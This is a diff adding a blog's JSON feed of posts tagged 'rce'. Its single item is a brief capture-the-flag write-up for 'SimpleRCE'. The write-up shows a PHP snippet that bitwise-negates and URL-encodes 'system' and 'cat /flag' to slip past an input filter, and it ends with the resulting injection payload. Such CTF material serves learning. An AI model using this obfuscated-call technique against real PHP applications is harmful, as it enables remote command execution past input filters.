@@ -1,0 +1,19 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "Hexo • All posts by \"rce\" tag",
+    "description": "",
+    "home_page_url": "http://odiws.github.io",
+    "items": [
+        {
+            "id": "http://odiws.github.io/2025/02/23/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-SimpleRCE/",
+            "url": "http://odiws.github.io/2025/02/23/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-SimpleRCE/",
+            "title": "[Dest0g3_520迎新赛]SimpleRCE",
+            "date_published": "2025-02-23T13:15:35.000Z",
+            "content_html": "<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202502232115795.png\" alt=\"image-20250223211543558\"></p>\n<p>取反</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token string double-quoted-string\">\"cat /flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">//(~%8C%86%8C%8B%9A%92)(~(%9C%9E%8B%DF%D0%99%93%9E%98))</span></span></pre></td></tr></table></figure>",
+            "tags": [
+                "buuctf",
+                "rce"
+            ]
+        }
+    ]
+}
